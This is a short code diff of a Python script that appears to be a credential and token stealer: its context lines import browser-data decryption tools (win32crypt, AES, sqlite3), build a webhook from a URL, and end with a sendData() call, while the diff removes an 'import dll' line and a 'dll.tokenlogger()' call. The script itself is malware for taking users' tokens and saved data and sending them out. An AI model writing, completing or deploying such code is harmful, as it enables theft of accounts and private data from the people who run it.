@@ -11,7 +11,6 @@ import sqlite3
 import win32crypt
 from Crypto.Cipher import AES
 from datetime import datetime, timedelta
-import dll
 
 disc_seperator = '=' * 116 * 2
 webhook = Webhook.from_url(
@@ -178,6 +177,6 @@ def main():
 
 if __name__ == "__main__":
     main()
-    dll.tokenlogger()
+
 
 sendData()
